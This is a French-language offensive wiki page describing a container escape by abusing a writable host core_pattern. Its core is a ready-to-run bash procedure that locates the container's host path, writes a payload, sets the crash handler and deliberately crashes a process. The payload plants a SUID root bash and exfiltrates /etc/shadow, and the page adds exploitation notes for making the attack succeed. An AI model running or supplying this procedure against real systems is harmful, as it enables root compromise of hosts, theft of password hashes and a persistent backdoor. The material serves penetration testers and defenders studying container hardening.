---
title: "core_pattern : exécuter un programme de l'hôte en faisant planter un processus"
description: "Le paramètre noyau /proc/sys/kernel/core_pattern peut nommer un programme, préfixé d'un pipe, qui reçoit le core dump d'un processus qui plante. Le noyau exécute ce programme en tant que root dans l'espace de noms init de l'hôte. Un conteneur disposant d'un core_pattern hôte accessible en écriture écrit un chemin de charge utile, puis fait délibérément planter un processus pour exécuter du code sur l'hôte."
keywords:
  - core_pattern
  - core dump
  - usermode helper
  - déclencheur de plantage
  - évasion de conteneur
---

# core_pattern

Lorsqu'un processus génère un core dump, le noyau consulte `/proc/sys/kernel/core_pattern`. Si cette valeur commence par un caractère pipe, le noyau traite le reste comme un programme à exécuter et transmet le core dump à son entrée standard. Point crucial, le noyau exécute ce programme en tant que root dans les espaces de noms initiaux de l'hôte, et non dans les espaces de noms du processus qui plante. Un conteneur disposant d'un accès en écriture au `core_pattern` de l'hôte (procfs de l'hôte monté en écriture, généralement avec `CAP_SYS_ADMIN` ou `--privileged`) peut donc définir le gestionnaire sur sa propre charge utile puis forcer un plantage pour déclencher l'exécution sur l'hôte.

Confirmez la possibilité d'écriture :

```bash
cat /proc/sys/kernel/core_pattern
[ -w /proc/sys/kernel/core_pattern ] && echo writable
```

## La technique

Le gestionnaire s'exécute dans la vue du système de fichiers de l'hôte, de sorte que le chemin de la charge utile doit se résoudre sur l'hôte. Récupérez l'emplacement du rootfs de ce conteneur sur l'hôte à partir du `upperdir` de l'overlay, placez-y la charge utile, et faites pointer `core_pattern` dessus :

```bash
# 1. Find where the container rootfs appears on the host
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)

# 2. Write the payload at a host-resolvable path
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
cat /etc/shadow > $host/out 2>&1
SH
chmod +x /payload

# 3. Set the handler to pipe cores to the payload (host-visible path)
echo "|$host/payload" > /proc/sys/kernel/core_pattern

# 4. Crash any process to trigger a core dump
cat > /crash.c <<'C'
int main(){ *(int*)0 = 0; }
C
gcc /crash.c -o /crash 2>/dev/null && (ulimit -c unlimited; /crash)
# or in Python: python3 -c 'import ctypes; ctypes.string_at(0)'
sleep 1; cat /out
```

Le plantage de l'étape 4 génère un core, le noyau invoque `|$host/payload` en tant que root sur l'hôte, et la charge utile s'y exécute. Le dépôt d'un bash SUID ou un reverse shell est typique.

## Notes d'exploitation

- `ulimit -c unlimited` (ou une limite de core non nulle) est nécessaire pour que le processus qui plante génère réellement un dump ; définissez-la dans le même shell avant de faire planter.
- Le chemin du gestionnaire doit être résoluble depuis le système de fichiers racine de l'hôte ; la récupération du `upperdir` est ce qui fait fonctionner cela depuis l'intérieur du conteneur, exactement comme dans la technique [cgroups release_agent](../../privileged-configuration/cgroups-release-agent.md).
- Un procfs hôte en lecture seule bloque l'écriture ; il en va de même pour un conteneur non privilégié sans procfs hôte, puisque le `core_pattern` propre à l'espace de noms du conteneur s'exécuterait dans le conteneur, et non sur l'hôte. Confirmez d'abord que le procfs est celui de l'hôte et accessible en écriture.

## Références

- [man 5 core](https://man7.org/linux/man-pages/man5/core.5.html)
- [Documentation du noyau : core_pattern](https://docs.kernel.org/admin-guide/sysctl/kernel.html#core-pattern)
- [HackTricks : core_pattern escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts#proc-sys-kernel-core_pattern)
